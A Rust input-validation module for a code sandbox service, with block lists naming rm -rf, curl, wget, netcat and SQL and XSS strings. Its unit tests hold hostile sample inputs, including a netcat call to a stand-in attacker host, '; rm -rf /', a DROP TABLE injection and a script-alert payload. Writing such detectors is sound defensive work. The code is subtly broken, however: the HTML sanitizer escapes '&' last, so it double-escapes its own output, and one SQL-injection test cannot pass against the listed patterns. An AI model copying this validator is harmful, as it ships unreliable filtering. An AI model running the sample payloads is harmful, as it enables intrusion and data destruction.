//! Input validation and sanitization module
//! 
//! This module provides comprehensive input validation and sanitization
//! functionality to prevent security vulnerabilities like injection attacks,
//! XSS, path traversal, and other input-based security issues.

use regex::Regex;
use std::collections::HashMap;
use std::sync::LazyLock;
use tracing::{warn, error};

/// Maximum lengths for various input types
pub const MAX_USERNAME_LENGTH: usize = 64;
pub const MAX_EMAIL_LENGTH: usize = 255;
pub const MAX_SANDBOX_ID_LENGTH: usize = 128;
pub const MAX_CONTAINER_NAME_LENGTH: usize = 64;
pub const MAX_COMMAND_LENGTH: usize = 65536; // 64KB
pub const MAX_CODE_LENGTH: usize = 1048576; // 1MB
pub const MAX_FILENAME_LENGTH: usize = 255;
pub const MAX_PATH_LENGTH: usize = 4096;
pub const MAX_ENV_VAR_LENGTH: usize = 32768; // 32KB
pub const MAX_METADATA_VALUE_LENGTH: usize = 8192; // 8KB

/// Compiled regex patterns for validation
static USERNAME_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-zA-Z0-9_-]{3,64}$").expect("Invalid username regex")
});

static EMAIL_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$").expect("Invalid email regex")
});

static SANDBOX_ID_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-zA-Z0-9_-]{1,128}$").expect("Invalid sandbox ID regex")
});

static SAFE_FILENAME_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-zA-Z0-9._-]+$").expect("Invalid filename regex")
});

static DOCKER_IMAGE_REGEX: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"^[a-z0-9]+([._-][a-z0-9]+)*(/[a-z0-9]+([._-][a-z0-9]+)*)*(:[\w][\w.-]*)?$")
        .expect("Invalid Docker image regex")
});

/// Validation error types
#[derive(Debug, Clone)]
pub enum ValidationError {
    TooLong { field: String, max_length: usize, actual_length: usize },
    TooShort { field: String, min_length: usize, actual_length: usize },
    InvalidFormat { field: String, expected: String },
    InvalidCharacter { field: String, character: char },
    Empty { field: String },
    Dangerous { field: String, reason: String },
    PathTraversal { field: String },
    SqlInjection { field: String },
    XssAttempt { field: String },
    CommandInjection { field: String },
}

impl std::fmt::Display for ValidationError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ValidationError::TooLong { field, max_length, actual_length } => {
                write!(f, "Field '{}' is too long: {} characters (max: {})", field, actual_length, max_length)
            }
            ValidationError::TooShort { field, min_length, actual_length } => {
                write!(f, "Field '{}' is too short: {} characters (min: {})", field, actual_length, min_length)
            }
            ValidationError::InvalidFormat { field, expected } => {
                write!(f, "Field '{}' has invalid format. Expected: {}", field, expected)
            }
            ValidationError::InvalidCharacter { field, character } => {
                write!(f, "Field '{}' contains invalid character: '{}'", field, character)
            }
            ValidationError::Empty { field } => {
                write!(f, "Field '{}' cannot be empty", field)
            }
            ValidationError::Dangerous { field, reason } => {
                write!(f, "Field '{}' contains dangerous content: {}", field, reason)
            }
            ValidationError::PathTraversal { field } => {
                write!(f, "Field '{}' contains path traversal attempt", field)
            }
            ValidationError::SqlInjection { field } => {
                write!(f, "Field '{}' contains potential SQL injection", field)
            }
            ValidationError::XssAttempt { field } => {
                write!(f, "Field '{}' contains potential XSS attempt", field)
            }
            ValidationError::CommandInjection { field } => {
                write!(f, "Field '{}' contains potential command injection", field)
            }
        }
    }
}

impl std::error::Error for ValidationError {}

/// Result type for validation operations
pub type ValidationResult<T> = Result<T, ValidationError>;

/// Input validator for various data types
pub struct InputValidator;

impl InputValidator {
    /// Validate username
    pub fn validate_username(username: &str) -> ValidationResult<String> {
        if username.is_empty() {
            return Err(ValidationError::Empty { field: "username".to_string() });
        }
        
        if username.len() > MAX_USERNAME_LENGTH {
            return Err(ValidationError::TooLong {
                field: "username".to_string(),
                max_length: MAX_USERNAME_LENGTH,
                actual_length: username.len(),
            });
        }
        
        if !USERNAME_REGEX.is_match(username) {
            return Err(ValidationError::InvalidFormat {
                field: "username".to_string(),
                expected: "3-64 alphanumeric characters, underscore, or hyphen".to_string(),
            });
        }
        
        Ok(username.to_string())
    }
    
    /// Validate email address
    pub fn validate_email(email: &str) -> ValidationResult<String> {
        if email.is_empty() {
            return Err(ValidationError::Empty { field: "email".to_string() });
        }
        
        if email.len() > MAX_EMAIL_LENGTH {
            return Err(ValidationError::TooLong {
                field: "email".to_string(),
                max_length: MAX_EMAIL_LENGTH,
                actual_length: email.len(),
            });
        }
        
        if !EMAIL_REGEX.is_match(email) {
            return Err(ValidationError::InvalidFormat {
                field: "email".to_string(),
                expected: "valid email address format".to_string(),
            });
        }
        
        Ok(email.to_lowercase())
    }
    
    /// Validate sandbox ID
    pub fn validate_sandbox_id(sandbox_id: &str) -> ValidationResult<String> {
        if sandbox_id.is_empty() {
            return Err(ValidationError::Empty { field: "sandbox_id".to_string() });
        }
        
        if sandbox_id.len() > MAX_SANDBOX_ID_LENGTH {
            return Err(ValidationError::TooLong {
                field: "sandbox_id".to_string(),
                max_length: MAX_SANDBOX_ID_LENGTH,
                actual_length: sandbox_id.len(),
            });
        }
        
        if !SANDBOX_ID_REGEX.is_match(sandbox_id) {
            return Err(ValidationError::InvalidFormat {
                field: "sandbox_id".to_string(),
                expected: "alphanumeric characters, underscore, or hyphen only".to_string(),
            });
        }
        
        Ok(sandbox_id.to_string())
    }
    
    /// Validate Docker image name
    pub fn validate_docker_image(image: &str) -> ValidationResult<String> {
        if image.is_empty() {
            return Err(ValidationError::Empty { field: "docker_image".to_string() });
        }
        
        if image.len() > 256 {
            return Err(ValidationError::TooLong {
                field: "docker_image".to_string(),
                max_length: 256,
                actual_length: image.len(),
            });
        }
        
        if !DOCKER_IMAGE_REGEX.is_match(image) {
            return Err(ValidationError::InvalidFormat {
                field: "docker_image".to_string(),
                expected: "valid Docker image format".to_string(),
            });
        }
        
        Ok(image.to_string())
    }
    
    /// Validate filename (prevent path traversal)
    pub fn validate_filename(filename: &str) -> ValidationResult<String> {
        if filename.is_empty() {
            return Err(ValidationError::Empty { field: "filename".to_string() });
        }
        
        if filename.len() > MAX_FILENAME_LENGTH {
            return Err(ValidationError::TooLong {
                field: "filename".to_string(),
                max_length: MAX_FILENAME_LENGTH,
                actual_length: filename.len(),
            });
        }
        
        // Check for path traversal attempts
        if filename.contains("..") || filename.contains("/") || filename.contains("\\") {
            return Err(ValidationError::PathTraversal { field: "filename".to_string() });
        }
        
        // Check for dangerous filenames
        if filename.starts_with('.') && filename.len() <= 2 {
            return Err(ValidationError::Dangerous {
                field: "filename".to_string(),
                reason: "hidden system file".to_string(),
            });
        }
        
        if !SAFE_FILENAME_REGEX.is_match(filename) {
            return Err(ValidationError::InvalidFormat {
                field: "filename".to_string(),
                expected: "alphanumeric characters, dots, underscores, or hyphens only".to_string(),
            });
        }
        
        Ok(filename.to_string())
    }
    
    /// Validate file path (prevent path traversal)
    pub fn validate_file_path(path: &str) -> ValidationResult<String> {
        if path.is_empty() {
            return Err(ValidationError::Empty { field: "file_path".to_string() });
        }
        
        if path.len() > MAX_PATH_LENGTH {
            return Err(ValidationError::TooLong {
                field: "file_path".to_string(),
                max_length: MAX_PATH_LENGTH,
                actual_length: path.len(),
            });
        }
        
        // Check for path traversal attempts
        if path.contains("..") {
            return Err(ValidationError::PathTraversal { field: "file_path".to_string() });
        }
        
        // Check for absolute paths that might escape sandbox
        if path.starts_with("/proc") || path.starts_with("/sys") || path.starts_with("/dev") {
            return Err(ValidationError::Dangerous {
                field: "file_path".to_string(),
                reason: "access to system directories not allowed".to_string(),
            });
        }
        
        // Normalize path (remove multiple slashes, etc.)
        let normalized = path.replace("//", "/");
        
        Ok(normalized)
    }
    
    /// Validate code content (check for dangerous patterns)
    pub fn validate_code(code: &str, language: &str) -> ValidationResult<String> {
        if code.is_empty() {
            return Err(ValidationError::Empty { field: "code".to_string() });
        }
        
        if code.len() > MAX_CODE_LENGTH {
            return Err(ValidationError::TooLong {
                field: "code".to_string(),
                max_length: MAX_CODE_LENGTH,
                actual_length: code.len(),
            });
        }
        
        // Check for null bytes (potential for buffer overflows)
        if code.contains('\0') {
            return Err(ValidationError::InvalidCharacter {
                field: "code".to_string(),
                character: '\0',
            });
        }
        
        // Language-specific validation
        match language.to_lowercase().as_str() {
            "python" => Self::validate_python_code(code)?,
            "javascript" | "node" => Self::validate_javascript_code(code)?,
            "bash" | "sh" => Self::validate_bash_code(code)?,
            _ => {} // Other languages get basic validation only
        }
        
        Ok(code.to_string())
    }
    
    /// Validate Python code for dangerous patterns
    fn validate_python_code(code: &str) -> ValidationResult<()> {
        let dangerous_patterns = [
            "import os", "import subprocess", "import sys", "import socket",
            "__import__", "exec(", "eval(", "compile(",
            "open(", "file(", "input(", "raw_input(",
        ];
        
        for pattern in &dangerous_patterns {
            if code.contains(pattern) {
                warn!("Potentially dangerous Python pattern detected: {}", pattern);
                // Don't block, just log for now - let runtime restrictions handle it
            }
        }
        
        Ok(())
    }
    
    /// Validate JavaScript code for dangerous patterns
    fn validate_javascript_code(code: &str) -> ValidationResult<()> {
        let dangerous_patterns = [
            "require(", "import(", "eval(", "Function(",
            "XMLHttpRequest", "fetch(", "WebSocket",
            "document.", "window.", "global.", "process.",
        ];
        
        for pattern in &dangerous_patterns {
            if code.contains(pattern) {
                warn!("Potentially dangerous JavaScript pattern detected: {}", pattern);
                // Don't block, just log for now
            }
        }
        
        Ok(())
    }
    
    /// Validate Bash code for dangerous patterns
    fn validate_bash_code(code: &str) -> ValidationResult<()> {
        let dangerous_patterns = [
            "rm -rf", "sudo", "su -", "chmod +x",
            "wget", "curl", "nc ", "netcat",
            "> /dev", "< /dev", "|| ", "&& ",
            "$(", "`", "eval ", "exec ",
        ];
        
        for pattern in &dangerous_patterns {
            if code.contains(pattern) {
                return Err(ValidationError::Dangerous {
                    field: "bash_code".to_string(),
                    reason: format!("dangerous pattern: {}", pattern),
                });
            }
        }
        
        Ok(())
    }
    
    /// Validate environment variables
    pub fn validate_env_vars(env_vars: &HashMap<String, String>) -> ValidationResult<HashMap<String, String>> {
        let mut validated = HashMap::new();
        
        for (key, value) in env_vars {
            // Validate key
            if key.is_empty() {
                return Err(ValidationError::Empty { field: "env_var_key".to_string() });
            }
            
            if key.len() > 256 {
                return Err(ValidationError::TooLong {
                    field: "env_var_key".to_string(),
                    max_length: 256,
                    actual_length: key.len(),
                });
            }
            
            // Environment variable names should be alphanumeric with underscores
            if !key.chars().all(|c| c.is_ascii_alphanumeric() || c == '_') {
                return Err(ValidationError::InvalidFormat {
                    field: "env_var_key".to_string(),
                    expected: "alphanumeric characters and underscores only".to_string(),
                });
            }
            
            // Validate value
            if value.len() > MAX_ENV_VAR_LENGTH {
                return Err(ValidationError::TooLong {
                    field: "env_var_value".to_string(),
                    max_length: MAX_ENV_VAR_LENGTH,
                    actual_length: value.len(),
                });
            }
            
            // Check for null bytes
            if value.contains('\0') {
                return Err(ValidationError::InvalidCharacter {
                    field: "env_var_value".to_string(),
                    character: '\0',
                });
            }
            
            // Check for potentially dangerous values
            if value.contains("$(") || value.contains("`") || value.contains("&&") || value.contains("||") {
                warn!("Potentially dangerous environment variable value: {} = {}", key, value);
            }
            
            validated.insert(key.clone(), value.clone());
        }
        
        Ok(validated)
    }
    
    /// Sanitize string for safe display (prevent XSS)
    pub fn sanitize_for_display(input: &str) -> String {
        input
            .replace('<', "&lt;")
            .replace('>', "&gt;")
            .replace('"', "&quot;")
            .replace('\'', "&#x27;")
            .replace('&', "&amp;")
    }
    
    /// Validate and sanitize metadata
    pub fn validate_metadata(metadata: &HashMap<String, String>) -> ValidationResult<HashMap<String, String>> {
        let mut validated = HashMap::new();
        
        for (key, value) in metadata {
            // Validate key
            if key.is_empty() {
                return Err(ValidationError::Empty { field: "metadata_key".to_string() });
            }
            
            if key.len() > 256 {
                return Err(ValidationError::TooLong {
                    field: "metadata_key".to_string(),
                    max_length: 256,
                    actual_length: key.len(),
                });
            }
            
            // Validate value
            if value.len() > MAX_METADATA_VALUE_LENGTH {
                return Err(ValidationError::TooLong {
                    field: "metadata_value".to_string(),
                    max_length: MAX_METADATA_VALUE_LENGTH,
                    actual_length: value.len(),
                });
            }
            
            // Check for potential injection attacks
            Self::check_injection_patterns(value, "metadata_value")?;
            
            // Sanitize the value
            let sanitized_value = Self::sanitize_for_display(value);
            
            validated.insert(key.clone(), sanitized_value);
        }
        
        Ok(validated)
    }
    
    /// Check for common injection patterns
    fn check_injection_patterns(input: &str, field_name: &str) -> ValidationResult<()> {
        // SQL injection patterns
        let sql_patterns = [
            "'; DROP", "'; DELETE", "'; INSERT", "'; UPDATE",
            "UNION SELECT", "OR 1=1", "AND 1=1",
            "/*", "*/", "--", "xp_",
        ];
        
        for pattern in &sql_patterns {
            if input.to_uppercase().contains(&pattern.to_uppercase()) {
                error!("SQL injection attempt detected in {}: {}", field_name, pattern);
                return Err(ValidationError::SqlInjection { field: field_name.to_string() });
            }
        }
        
        // XSS patterns
        let xss_patterns = [
            "<script", "</script>", "javascript:", "onload=", "onerror=",
            "onclick=", "onmouseover=", "onfocus=", "<iframe", "<object",
        ];
        
        for pattern in &xss_patterns {
            if input.to_lowercase().contains(&pattern.to_lowercase()) {
                error!("XSS attempt detected in {}: {}", field_name, pattern);
                return Err(ValidationError::XssAttempt { field: field_name.to_string() });
            }
        }
        
        // Command injection patterns
        let cmd_patterns = [
            "; rm", "; del", "| nc", "| netcat", "&& rm", "|| rm",
            "`rm", "$(rm", "${rm", "; cat", "; wget", "; curl",
        ];
        
        for pattern in &cmd_patterns {
            if input.to_lowercase().contains(&pattern.to_lowercase()) {
                error!("Command injection attempt detected in {}: {}", field_name, pattern);
                return Err(ValidationError::CommandInjection { field: field_name.to_string() });
            }
        }
        
        Ok(())
    }
    
    /// Validate resource limits
    pub fn validate_memory_limit(memory_mb: u64, max_allowed: u64) -> ValidationResult<u64> {
        if memory_mb == 0 {
            return Err(ValidationError::Empty { field: "memory_limit".to_string() });
        }
        
        if memory_mb > max_allowed {
            return Err(ValidationError::TooLong {
                field: "memory_limit".to_string(),
                max_length: max_allowed as usize,
                actual_length: memory_mb as usize,
            });
        }
        
        Ok(memory_mb)
    }
    
    /// Validate CPU cores
    pub fn validate_cpu_cores(cpu_cores: f64, max_allowed: f64) -> ValidationResult<f64> {
        if cpu_cores <= 0.0 {
            return Err(ValidationError::Empty { field: "cpu_cores".to_string() });
        }
        
        if cpu_cores > max_allowed {
            return Err(ValidationError::TooLong {
                field: "cpu_cores".to_string(),
                max_length: max_allowed as usize,
                actual_length: cpu_cores as usize,
            });
        }
        
        Ok(cpu_cores)
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    
    #[test]
    fn test_username_validation() {
        // Valid usernames
        assert!(InputValidator::validate_username("user123").is_ok());
        assert!(InputValidator::validate_username("test_user").is_ok());
        assert!(InputValidator::validate_username("my-user").is_ok());
        
        // Invalid usernames
        assert!(InputValidator::validate_username("").is_err());
        assert!(InputValidator::validate_username("ab").is_err()); // Too short
        assert!(InputValidator::validate_username("user@domain").is_err()); // Invalid char
        assert!(InputValidator::validate_username("a".repeat(100).as_str()).is_err()); // Too long
    }
    
    #[test]
    fn test_email_validation() {
        // Valid emails
        assert!(InputValidator::validate_email("test@example.com").is_ok());
        assert!(InputValidator::validate_email("user.name+tag@domain.co.uk").is_ok());
        
        // Invalid emails
        assert!(InputValidator::validate_email("").is_err());
        assert!(InputValidator::validate_email("invalid-email").is_err());
        assert!(InputValidator::validate_email("@domain.com").is_err());
        assert!(InputValidator::validate_email("user@").is_err());
    }
    
    #[test]
    fn test_filename_validation() {
        // Valid filenames
        assert!(InputValidator::validate_filename("script.py").is_ok());
        assert!(InputValidator::validate_filename("data-file.txt").is_ok());
        assert!(InputValidator::validate_filename("test_123.csv").is_ok());
        
        // Invalid filenames
        assert!(InputValidator::validate_filename("").is_err());
        assert!(InputValidator::validate_filename("../etc/passwd").is_err()); // Path traversal
        assert!(InputValidator::validate_filename("file/with/slashes").is_err());
        assert!(InputValidator::validate_filename("..").is_err()); // Current/parent dir
    }
    
    #[test]
    fn test_code_validation() {
        // Valid code
        assert!(InputValidator::validate_code("print('hello world')", "python").is_ok());
        assert!(InputValidator::validate_code("console.log('hello')", "javascript").is_ok());
        
        // Invalid code
        assert!(InputValidator::validate_code("", "python").is_err()); // Empty
        assert!(InputValidator::validate_code("code\0with\0nulls", "python").is_err()); // Null bytes
        assert!(InputValidator::validate_code("rm -rf /", "bash").is_err()); // Dangerous bash
    }
    
    #[test]
    fn test_injection_detection() {
        // SQL injection
        assert!(InputValidator::check_injection_patterns("'; DROP TABLE users; --", "test").is_err());
        assert!(InputValidator::check_injection_patterns("1' OR '1'='1", "test").is_err());
        
        // XSS
        assert!(InputValidator::check_injection_patterns("<script>alert('xss')</script>", "test").is_err());
        assert!(InputValidator::check_injection_patterns("javascript:alert(1)", "test").is_err());
        
        // Command injection
        assert!(InputValidator::check_injection_patterns("; rm -rf /", "test").is_err());
        assert!(InputValidator::check_injection_patterns("| nc attacker.com 1234", "test").is_err());
        
        // Safe input
        assert!(InputValidator::check_injection_patterns("normal text content", "test").is_ok());
    }
}